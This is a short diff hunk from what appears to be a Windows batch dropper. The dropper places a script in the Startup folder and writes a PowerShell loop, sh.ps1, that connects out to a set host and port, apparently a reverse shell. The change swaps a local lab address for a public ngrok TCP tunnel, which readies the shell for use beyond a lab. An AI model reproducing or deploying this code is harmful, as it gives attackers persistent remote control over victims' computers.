@@ -21,8 +21,8 @@ move "%temp%\start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
 set FILE=%temp%\sh.ps1
 if not exist %FILE% (
     (
-        echo $ip = "192.168.1.16"
-        echo $port = 4444
+        echo $ip = "7.tcp.eu.ngrok.io"
+        echo $port = 13153
         echo.
         echo while ^($true^) ^{
         echo      try ^{
